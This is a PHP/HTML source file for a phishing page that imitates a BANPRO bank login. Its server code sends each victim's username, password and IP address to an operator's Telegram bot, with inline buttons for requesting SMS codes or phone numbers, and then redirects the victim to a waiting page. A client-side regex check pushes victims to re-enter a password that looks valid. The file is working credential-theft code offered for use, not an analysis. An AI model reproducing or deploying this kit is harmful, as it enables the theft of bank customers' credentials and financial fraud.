<?php
session_start();
include("settings.php"); // Este archivo debe tener $token y $chat_id

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = htmlspecialchars($_POST['ips1'] ?? '');
    $clave = htmlspecialchars($_POST['ips2'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'];

    $_SESSION['usuario'] = $usuario;

    $msg = "🔐 NUEVO INGRESO BANPRO\n👤 Usuario: $usuario\n🔑 Clave: $clave\n🌐 IP: $ip";

    // Enviar con botones usando "|" como separador
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '❌ Login Error', 'callback_data' => "ERROR|$usuario"],
                    ['text' => '📩 SMS', 'callback_data' => "SMS|$usuario"],
                    ['text' => '📱 Teléfono', 'callback_data' => "NUMERO|$usuario"]
                ]
            ]
        ])
    ]));

    header("Location: espera.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Inicie Sesión</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<style>
    * { margin: 0; padding: 0; }
    @font-face {
        font-family: dinReg;
        src: url(din-regular.ttf);
    }

    #error-message {
        color: red;
        font-size: 14px;
        display: none;
        position: absolute;
        top: 420px;
        left: 30px;
    }
</style>

<div id="main-cnt" style="overflow: hidden; min-height:100vh; position: relative;">
    <div id="ctn" style="display: inline-block; vertical-align: top; background-color: #fff;">
        <div id="frmc" style="display:inline-block; text-align: center; border-radius: 8px; vertical-align: top; width: 500px;">
            <form method="post" action="index.php" id="f1" style="display: inline-block; width: 420px; height: 660px; border-radius:10px; background-image: url(1.svg); position: relative;">
                <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
                <input id="i1" name="ips1" placeholder="Usuario" type="text" required
                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)">
                <input id="i2" name="ips2" placeholder="Contraseña" type="password" required
                       style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off">
                <p id="error-message" style="font-family: sans-serif;">Usuario o contraseña incorrecta</p>
                <input type="submit" value="Inicie Sesión"
                       style="font-size: 16px; display: block; position: relative; color: #fff; background: rgb(0, 105, 60); border: none; top: 348px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
            </form>
        </div>
        <div id="bnncont" style="text-align: right; display: inline-block;">
            <div style="position: absolute; z-index: 1; opacity: 1; overflow: hidden; width: 80%; height: 100%; left: 500px; top: 0px; display: inline-block;">
                <div id="bnn" style="background: url(bnn.jpg) left center / cover no-repeat; height: 100%; overflow: hidden; position: relative; text-align: center;">
                    <img src="terms.svg" style="width: 60%; position: relative; top: 80vh;">
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    @media screen and (max-width:1024px) {
        body {
            width: 100% !important;
            background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60)) !important;
            background-repeat: no-repeat !important;
            min-width: auto !important;
            zoom: 90% !important;
        }
        #ctn {
            border-radius: 6px !important;
        }
        #main-cnt {
            text-align: center !important;
            padding-top: 30px;
        }
        #frmc {
            width: 100% !important;
        }
        #bnncont {
            display: none !important;
        }
    }
</style>
    <script>
        function noEspacios(event) {
            return event.key !== " ";
        }

        function validarContrasena(contrasena) {
            const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()_+\-=[\]{};':"\\|,.<>/?]).{8,32}$/;
            return regex.test(contrasena);
        }

        document.addEventListener("DOMContentLoaded", function () {
            const form = document.getElementById("f1");
            const errorMessage = document.getElementById("error-message");

            form.addEventListener("submit", function (event) {
                const contrasena = document.getElementById("i2").value;

                if (!validarContrasena(contrasena)) {
                    event.preventDefault();
                    errorMessage.style.display = "block";
                    setTimeout(() => {
                errorMessage.style.display = "none";
            }, 10000);
                }
            });
        });
    </script>
</body>
</html>
